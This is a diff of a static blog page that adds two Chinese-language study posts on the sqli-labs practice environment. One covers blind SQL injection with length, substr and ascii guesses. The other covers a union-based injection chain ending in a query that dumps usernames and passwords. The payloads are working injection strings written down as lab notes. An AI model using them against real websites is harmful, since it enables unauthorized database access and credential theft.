@@ -64,6 +64,93 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-5" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/11/25/page-5/" class="article-date">
+  <time datetime="2020-11-25T12:28:10.000Z" itemprop="datePublished">2020-11-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/11/25/page-5/">盲注</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>?id=1’ and length(database())=n %23 n从0到无穷大 猜出数据库长度 </p>
+<p>?id=1’ and left(database(),1)&gt;’<strong><em>a</em></strong>‘–+ 猜数据库首字母 显示you are in 表示该字母还在输入的字母后假设输入一个显示you are in的下一个什么都没显示 则为此 第二第三位一次猜下去（猜库名）</p>
+<ul>
+<li>利用substr() ascii()函数进行尝试</li>
+</ul>
+<p>?id=1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit <strong>0</strong>,1),<strong><em>1</em></strong>,1))&gt;<strong>100</strong>–+  加黑数字更改 此为ascii码对照数字对应字母 也是和猜库名一样的操作  这猜第一个库的第一个字符   然后一个一个改 猜出第n个库的第n个字符</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/11/25/page-5/" data-id="ckhxdwgkq0000x0v76f1pa6wz" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-page-4" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/11/19/page-4/" class="article-date">
+  <time datetime="2020-11-19T15:23:35.000Z" itemprop="datePublished">2020-11-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/11/19/page-4/">sqli-labs</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>前两关</p>
+<p>输入？id=1和？id=2 和？id=2-1</p>
+<p>若2-1的结果和2一样则为字符型 若2-1 和1的结果一样则为数字型</p>
+<p>然后<em>确认字段位数</em> order by 数字一个个试看哪个报错就可确认其为n-1位</p>
+<p><em>确认占位信息</em>    ？id=-1 union select 1，<em>2，3 –+</em></p>
+<p><em>找库名</em>    ？id=-1 union select 1，2，database（）2之后的便是库名</p>
+<p><em>找表名</em>   ?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’–+ </p>
+<p><em>找字段名</em>   ?id=-1 union select 1,2,group_concat(column_name) from information_schema.COLUMNs where table_schema=’security’ and table_name=’users’–+</p>
+<p><em>找账号密码</em>  ?id=-1 union select 1,2,group_concat(concat_ws(‘,’,username,password) SEPARATOR ‘|’) from users –+</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/11/19/page-4/" data-id="ckhoziyeg0000fcv756n202kc" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-page-3" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2020/11/19/page-3/" class="article-date">
@@ -691,7 +778,7 @@ echo "Have a good night!";
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
     </div>
   </div>
 
@@ -704,7 +791,15 @@ echo "Have a good night!";
       <ul>
         
           <li>
-            <a href="/2021/02/22/page-31/">uploadlabs 1-7</a>
+            <a href="/2021/03/01/page-33/">十六实在不会</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/01/page-32/">uplolalabs&#39;13 14 15</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/22/page-31/">uploadlabs 1-9</a>
           </li>
         
           <li>
@@ -713,14 +808,6 @@ echo "Have a good night!";
         
           <li>
             <a href="/2021/02/18/page-29/">sqlilabs 46 47 48 49</a>
-          </li>
-        
-          <li>
-            <a href="/2021/02/15/page-28/">sqlilabs 38 39 40 41</a>
-          </li>
-        
-          <li>
-            <a href="/2021/02/15/page-27/">sqlilabs 42 43 44 45</a>
           </li>
         
       </ul>
